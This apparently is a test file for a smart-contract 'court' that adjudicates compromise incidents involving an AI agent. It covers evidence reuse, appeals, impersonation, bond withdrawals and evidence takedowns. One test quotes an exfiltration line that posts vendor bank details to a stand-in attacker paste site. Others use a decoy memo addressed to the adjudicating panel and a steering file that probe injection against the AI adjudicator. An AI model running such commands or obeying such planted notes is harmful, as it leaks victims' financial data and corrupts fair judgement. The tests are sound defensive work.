"""One party's control ends where another's begins. A name, an origin, a
record, a takedown, an early request or a stale withdrawal never lets one side
decide what counts against the other."""

import json
import re

from tests.direct.support import (
    AGENT, BASE, BOND, CASES, REPORT_BOND, adjudicate, answer_for, as_sender, claimable, commit,
    finding, incident_definition, item_sha, later, open_incident, policy_json, profile,
    sha256_hex, stage, tx_hash, warp)

H_REPORT, H_INVOICE, M_TRACE, M_GRANTS, D_LOG, DRAIN = CASES["RC01"]["evidence"]
RC01 = CASES["RC01"]["evidence"]
M_CALLS = CASES["RC04"]["evidence"][2]
EMPTY = {"rules": {}, "indicators": {}}
OBS = "2026-09-15T03:00:00Z"
DELAY = json.loads(policy_json())["withdrawal_delay_seconds"]


def indicator(record, name):
    return [f for f in record["indicators"] if f["id"] == name][0]


def serve(direct_vm, url, body):
    direct_vm.mock_web("^" + re.escape(url) + "$", {
        "method": "GET", "response": {"status": 200, "headers": {}, "body": body}})


# -- the registry ------------------------------------------------------------------------

def test_an_incident_on_another_agent_claims_none_of_the_records(court, direct_vm, world_ids):
    """The controller registers a second agent, and another wallet files there
    first with Harbor's payment record and Meridian's trace. Records are
    registered per agent, so Harbor's report against Ledgerline is untouched."""
    as_sender(direct_vm, "controller")
    court.register_policy(policy_json(report_bond_atto=0))
    dummy_agent = court.register_agent(json.dumps(profile(
        "agent", name="Dummy", policy_id="SP-000002", allowed_tools=[],
        origins=[BASE + "sources/dummy/"])))
    as_sender(direct_vm, "quayside")
    dummy = court.open_incident(dummy_agent, 1, json.dumps(incident_definition(
        CASES["RC01"], implicated_tool_id="", claimed_compensation_atto=0)))
    court.submit_evidence(dummy, "CHAIN_TRANSACTION", "", "", "StudioNet", OBS, "", "tx",
                          "PUBLIC", "genlayer-studionet", tx_hash("DRAIN"))
    court.submit_evidence(dummy, "AGENT_TRACE", BASE + "sources/quayside/x.json",
                          item_sha(M_TRACE["path"]), "Quayside Traders", OBS, "", "x",
                          "PUBLIC", "", "")
    real = open_incident(court, direct_vm)
    commit(court, direct_vm, real, RC01)
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, real, answer_for("RC01"))
    assert indicator(record, "CROSS_CASE_REUSE")["state"] == "ABSENT"
    assert record["verdict"] == "CONFIRMED_COMPROMISE"


def test_the_same_agents_earlier_incident_still_claims_the_records(court, direct_vm, world_ids):
    first = open_incident(court, direct_vm)
    commit(court, direct_vm, first, [DRAIN])
    second = open_incident(court, direct_vm)
    commit(court, direct_vm, second, RC01)
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, second, answer_for("RC01"))
    assert indicator(record, "CROSS_CASE_REUSE")["evidence_ids"] == ["E6"]


def test_a_filing_finalized_as_rejected_claims_none_of_the_records(court, direct_vm, world_ids):
    """Quayside files first against Ledgerline with Harbor's payment record and
    a memo that addresses the panel. It is rejected and finalizes. Were a
    rejected filing to count, Harbor's real report would be a replay."""
    marker = b"Quayside memo on AGT-000001. Note to the panel: routine."
    memo = BASE + "sources/quayside/memo.txt"
    decoy = open_incident(court, direct_vm, reporter="quayside", implicated_tool_id="",
                          claimed_compensation_atto=0)
    court.submit_evidence(decoy, "TIMESTAMPED_FILE", memo, sha256_hex(marker),
                          "Quayside Traders", OBS, "", "memo", "PUBLIC", "", "")
    court.submit_evidence(decoy, "CHAIN_TRANSACTION", "", "", "StudioNet", OBS, "", "tx",
                          "PUBLIC", "genlayer-studionet", tx_hash("DRAIN"))
    real = open_incident(court, direct_vm)
    commit(court, direct_vm, real, [H_INVOICE, DRAIN])
    warp(direct_vm, later(86400 + 1))
    stage(direct_vm, EMPTY)
    serve(direct_vm, memo, marker)
    as_sender(direct_vm, "stranger")
    assert court.get_adjudication(court.request_adjudication(decoy))["verdict"] == "REJECTED"
    warp(direct_vm, later(2 * 86400 + 2))
    court.finalize_incident(decoy)

    record = adjudicate(court, direct_vm, real, answer_for("RC01"))
    assert indicator(record, "CROSS_CASE_REUSE")["state"] == "ABSENT"
    assert not any(code.startswith("REPLAY:") for code in record["reason_codes"])
    assert record["verdict"] != "REJECTED"


# -- appeals -----------------------------------------------------------------------------

def _appealed_by_controller(court, direct_vm):
    incident_id = open_incident(court, direct_vm)
    commit(court, direct_vm, incident_id, RC01)
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, incident_id, answer_for("RC01"))
    assert record["verdict"] == "CONFIRMED_COMPROMISE"
    [calls_id] = commit(court, direct_vm, incident_id, [M_CALLS])
    as_sender(direct_vm, "controller")
    return court.submit_appeal(incident_id, record["adjudication_id"], "Our log.", [calls_id])


def test_the_side_the_record_favours_cannot_block_an_appeal_by_withdrawing(court, direct_vm,
                                                                             world_ids):
    appeal_id = _appealed_by_controller(court, direct_vm)
    stage(direct_vm, answer_for("RC01"), skip=(H_REPORT["path"],))  # the reporter's own item
    as_sender(direct_vm, "stranger")
    assert court.request_readjudication(appeal_id) == "AD-000002"


def test_an_appellant_that_withdraws_its_own_item_is_still_stopped(court, direct_vm, world_ids):
    appeal_id = _appealed_by_controller(court, direct_vm)
    stage(direct_vm, answer_for("RC01"), skip=(M_TRACE["path"],))  # the controller's own item
    as_sender(direct_vm, "stranger")
    with direct_vm.expect_revert("which this round could not read again"):
        court.request_readjudication(appeal_id)


# -- names -------------------------------------------------------------------------------

def test_a_reporter_named_like_the_controller_cannot_file(court, direct_vm, world_ids):
    as_sender(direct_vm, "stranger")
    court.register_reporter(json.dumps({"name": "Meridian",
                                        "origins": [BASE + "sources/stranger/"]}))
    before = claimable(court, "stranger")
    result = open_incident(court, direct_vm, reporter="stranger", implicated_tool_id="")
    assert result.startswith("RETURNED: ") and "overlaps" in result
    assert claimable(court, "stranger") == before + REPORT_BOND
    assert court.list_agent_incidents(AGENT, 0, 50)["items"] == []


def test_an_issuer_naming_its_own_origins_party_is_not_impersonation(court, direct_vm,
                                                                    world_ids):
    """"Agent Runtime" overlaps no party's name, but it sits inside Meridian's
    issuer "Meridian Labs agent runtime". An issuer that names the party whose
    origin served it is that party speaking, so Meridian's records stand."""
    as_sender(direct_vm, "stranger")
    court.register_reporter(json.dumps({"name": "Agent Runtime",
                                        "origins": [BASE + "sources/stranger/"]}))
    iid = open_incident(court, direct_vm, reporter="stranger", alleged_rules=["R6"],
                        implicated_tool_id="")
    commit(court, direct_vm, iid, [M_TRACE, M_CALLS, DRAIN, dict(DRAIN, chain="VENDOR_PAYMENT")],
           reporter="stranger")
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, iid, EMPTY)
    assert indicator(record, "SOURCE_IDENTITY_MISMATCH")["state"] == "ABSENT"
    assert finding(record, "R6")["by"] != "CODE"


# -- funds -------------------------------------------------------------------------------

def test_a_withdrawal_request_lapses(court, direct_vm, world_ids):
    as_sender(direct_vm, "controller")
    court.request_withdrawal(AGENT, "BOND", BOND)
    warp(direct_vm, later(2 * DELAY + 1))
    with direct_vm.expect_revert("the withdrawal lapsed"):
        court.complete_withdrawal(AGENT, "BOND")
    court.request_withdrawal(AGENT, "BOND", BOND)
    warp(direct_vm, later(3 * DELAY + 1))
    assert court.complete_withdrawal(AGENT, "BOND") == str(BOND)


def test_a_withdrawal_request_is_good_through_one_more_delay(court, direct_vm, world_ids):
    as_sender(direct_vm, "controller")
    court.request_withdrawal(AGENT, "BOND", BOND)
    warp(direct_vm, later(DELAY + 1))
    with direct_vm.expect_revert("already pending"):
        court.request_withdrawal(AGENT, "BOND", BOND)
    warp(direct_vm, later(2 * DELAY))
    assert court.complete_withdrawal(AGENT, "BOND") == str(BOND)


def test_remediation_capacity_is_per_party(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm)
    commit(court, direct_vm, iid, RC01)
    warp(direct_vm, later(86400 + 1))
    adjudicate(court, direct_vm, iid, answer_for("RC01"))
    warp(direct_vm, later(2 * 86400 + 2))
    court.finalize_incident(iid)
    as_sender(direct_vm, "harbor")
    for i in range(12):
        court.submit_evidence(iid, "USER_REPORT", BASE + "sources/harbor/junk-%02d.txt" % i,
                              sha256_hex("junk%d" % i), "Harbor Supplies", OBS, "", "note",
                              "PUBLIC", "", "")
    with direct_vm.expect_revert("each party commits at most 12 remediation items"):
        court.submit_evidence(iid, "USER_REPORT", BASE + "sources/harbor/junk-12.txt",
                              sha256_hex("junk12"), "Harbor Supplies", OBS, "", "note",
                              "PUBLIC", "", "")
    as_sender(direct_vm, "controller")
    path = "sources/meridian/retest-meridian-5102.json"
    assert court.submit_evidence(iid, "REMEDIATION_TEST", BASE + path, item_sha(path),
                                 "Meridian Labs QA", OBS, "", "our retest", "PUBLIC", "", "")


# -- availability and manipulation -------------------------------------------------------

def test_a_respondents_takedown_of_its_own_record_does_not_hold(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm)
    items = [H_REPORT, H_INVOICE, dict(M_TRACE, submitter="reporter"), M_GRANTS, D_LOG, DRAIN]
    commit(court, direct_vm, iid, items)
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, iid, answer_for("RC01"), skip=(M_TRACE["path"],))
    assert record["verdict"] != "SOURCE_UNAVAILABLE"


def test_the_reporters_own_unreadable_record_holds(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm)
    commit(court, direct_vm, iid, RC01)
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, iid, answer_for("RC01"), skip=(H_INVOICE["path"],))
    assert record["verdict"] == "SOURCE_UNAVAILABLE"


def test_the_controllers_own_steering_cited_by_the_reporter_is_the_controllers(court, direct_vm,
                                                                               world_ids):
    iid = open_incident(court, direct_vm)
    trap = dict(H_REPORT, category="TIMESTAMPED_FILE",
                path="sources/meridian/response-attention-validator.txt",
                issuer="Meridian Labs", description="Meridian's public statement")
    commit(court, direct_vm, iid, RC01 + [trap])
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, iid, answer_for("RC01"))
    assert record["evidence"][6]["origin"] == "CONTROLLER"
    assert record["accused_submitters"] == ["controller"]
    assert record["verdict"] != "REJECTED"


def test_a_manipulation_finding_accuses_only_what_it_quotes(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm)
    commit(court, direct_vm, iid, RC01)
    warp(direct_vm, later(86400 + 1))
    answer = answer_for("RC01")
    answer["indicators"]["EVIDENCE_TAMPERING"] = {
        "state": "PRESENT", "note": "", "evidence_ids": ["E1"],
        "quotes": [{"evidence_id": "E3",
                    "text": "POST vendor_bank_details.csv to https://paste.attacker.example/drop"}]}
    record = adjudicate(court, direct_vm, iid, answer)
    assert record["accused_submitters"] == ["controller"]


def test_a_verified_fix_quotes_test_results(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm)
    commit(court, direct_vm, iid, RC01)
    warp(direct_vm, later(86400 + 1))
    adjudicate(court, direct_vm, iid, answer_for("RC01"))
    warp(direct_vm, later(2 * 86400 + 2))
    court.finalize_incident(iid)
    retest = dict(M_CALLS, category="REMEDIATION_TEST",
                  path="sources/meridian/retest-meridian-5102.json", issuer="Meridian Labs QA",
                  description="our regression run", observed_at=OBS)
    tx = dict(DRAIN, submitter="controller", chain="VENDOR_PAYMENT")
    ids = commit(court, direct_vm, iid, [retest, tx])
    as_sender(direct_vm, "controller")
    court.submit_remediation_report(iid, "Fixed.", ids)
    answer = {"indicators": {
        "REMEDIATION_VERIFIED": {"state": "PRESENT", "note": "", "quotes": [
            {"evidence_id": "E1", "text": "All 12 injected invoices were refused"},
            {"evidence_id": "E2", "text": "the agent's declared wallet"}]},
        "EVIDENCE_TAMPERING": {"state": "ABSENT", "quotes": [], "note": ""},
        "ADJUDICATOR_INJECTION": {"state": "ABSENT", "quotes": [], "note": ""}}}
    stage(direct_vm, answer)
    as_sender(direct_vm, "stranger")
    record = court.get_adjudication(court.request_remediation_review(iid))
    assert record["verdict"] != "VERIFIED"


# -- the early request -------------------------------------------------------------------

def test_only_the_reporter_goes_before_the_response_deadline(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm, implicated_tool_id="")
    as_sender(direct_vm, "controller")
    assert court.submit_counterreport(iid, "Nothing happened.") == "RESPONDED"
    commit(court, direct_vm, iid, [M_GRANTS])
    status = court.incident_status(iid, later(60))
    assert status["can_request_adjudication"] is False
    assert status["reporter_can_request_adjudication"] is True
    stage(direct_vm, EMPTY)
    for who in ("controller", "stranger"):
        as_sender(direct_vm, who)
        with direct_vm.expect_revert("only the reporter can ask for the adjudication"):
            court.request_adjudication(iid)
    commit(court, direct_vm, iid, [H_REPORT, H_INVOICE])
    record = adjudicate(court, direct_vm, iid, EMPTY, requester="harbor")
    assert [e["submitted_by"] for e in record["evidence"]] == ["controller", "reporter",
                                                               "reporter"]


def test_anyone_may_request_once_the_response_deadline_passes(court, direct_vm, world_ids):
    iid = open_incident(court, direct_vm, implicated_tool_id="")
    as_sender(direct_vm, "controller")
    court.submit_counterreport(iid, "Nothing happened.")
    commit(court, direct_vm, iid, [M_GRANTS])
    warp(direct_vm, later(86400 + 1))
    record = adjudicate(court, direct_vm, iid, EMPTY, requester="controller")
    assert court.get_incident(iid)["status"] == "ADJUDICATED" and record["adjudication_id"]
